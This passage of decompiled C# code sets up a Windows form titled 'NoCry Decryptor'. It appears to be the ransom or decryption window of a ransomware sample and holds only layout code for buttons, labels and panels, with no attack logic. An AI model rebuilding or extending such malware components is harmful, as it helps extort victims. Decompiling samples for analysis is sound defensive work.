		((Form)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(589, 424));
		((Control)this).get_Controls().Add((Control)(object)Label10);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel3);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel2);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox2);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("NoCry Decryptor");
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		((Control)GroupBox2).ResumeLayout(false);
		((Control)GroupBox2).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
